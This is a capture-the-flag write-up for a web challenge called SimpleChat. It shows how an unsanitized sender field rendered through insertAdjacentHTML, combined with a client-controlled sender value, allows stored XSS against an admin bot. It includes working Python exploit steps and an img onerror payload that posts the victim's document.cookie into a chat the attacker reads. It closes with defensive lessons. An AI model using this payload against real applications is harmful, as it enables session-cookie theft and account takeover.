# SimpleChat

**CTF**: kashiCTF 2026
**Category**: Web
**Flag**: `kashiCTF{1r0nh3x_1s_th3_r34l_b0ss_n0_0n3_c4n_t0uch_h1m}`

## TL;DR

Stored XSS via unsanitized `sender` field in chat messages. Messages are HTML-entity-encoded, but the sender name is injected raw into `insertAdjacentHTML`. Register with XSS username → send message to admin → ping admin bot → exfiltrate cookie containing flag.

## Analysis

### Application Overview

Express/Node.js chat app with:
- Registration/login with session cookies (`connect.sid`)
- Chat between users via `/api/v1/insertChat` (POST) and `/api/v1/getChat` (GET)
- Admin bot triggered via `GET /ping?friend=USERNAME`
- User list at `/api/v1/users`

### The Sanitization

The server HTML-entity-encodes message text:
```
<script>alert(1)</script>  →  &lt;script&gt;alert(1)&lt;/script&gt;
```

ironhex was "really proud" of this — and it works. Message content is safe.

### The Vulnerability (CWE-79: Stored XSS)

The client-side `appendMessage()` function in `app.js` renders both the **message** and the **sender name** via `insertAdjacentHTML`:

```javascript
function appendMessage(name, img, side, text) {
  var msgHTML =
    '<div class="msg-info-name">' + name + '</div>' +  // ← UNSANITIZED
    '<div class="msg-text">' + text + '</div>';         // ← sanitized
  msgerChat.insertAdjacentHTML('beforeend', msgHTML);
}
```

The `name` parameter comes from `msg.sender` in the API response. The server sanitizes the **message** field but **NOT the sender field**.

Additionally, the `sender` field in `/api/v1/insertChat` is client-controlled — the server does not validate it against the authenticated session.

### Two bugs chain together:

1. **IDOR in sender field**: `insertChat` accepts any `sender` value, not just the logged-in user
2. **Missing sanitization on sender**: The sender name is stored and rendered raw as HTML

## Exploitation

### Step 1: Register a listener user

```python
s.post(f"{BASE}/api/v1/register", json={"username": "listener", "password": "Test12345"})
```

### Step 2: Register with XSS payload as username

```python
js = (
    f"fetch('/api/v1/insertChat',{{method:'POST',"
    f"headers:{{'Content-Type':'application/json'}},"
    f"body:JSON.stringify({{sender:'admin',receiver:'listener',message:document.cookie}}),"
    f"credentials:'same-origin'}})"
)
xss_user = f'<img src=x onerror="{js}">'

s2.post(f"{BASE}/api/v1/register", json={"username": xss_user, "password": "Test12345"})
```

The XSS payload makes the victim's browser send their `document.cookie` as a chat message back to our listener user.

### Step 3: Send message to admin from XSS user

```python
s2.post(f"{BASE}/api/v1/insertChat", json={
    "sender": xss_user,
    "receiver": "admin",
    "message": "please check this"
})
```

### Step 4: Trigger admin bot

```python
s2.get(f"{BASE}/ping", params={"friend": xss_user})
```

The admin bot opens the chat with our XSS user. When `appendMessage()` renders the sender name, the `<img onerror=...>` executes.

### Step 5: Read exfiltrated cookie

```python
r = s.get(f"{BASE}/api/v1/getChat", params={"friend": "admin"})
# Admin's message contains: flag=kashiCTF{...}; connect.sid=s:...
```

The flag is stored directly in the admin's cookie as `flag=kashiCTF{...}`.

## Key Takeaways

- **Sanitize ALL user-controlled data at the sink, not just some fields** — the message was sanitized but the sender was not
- **Validate sender identity server-side** — the `sender` field should come from the session, not from the client's POST body
- **`insertAdjacentHTML` is an XSS sink** — same as `innerHTML`. Use `textContent` for untrusted data
- **Don't just sanitize the obvious inputs** — ironhex sanitized messages perfectly but forgot that usernames are also rendered as HTML

## Files

- `flag.txt` — Captured flag
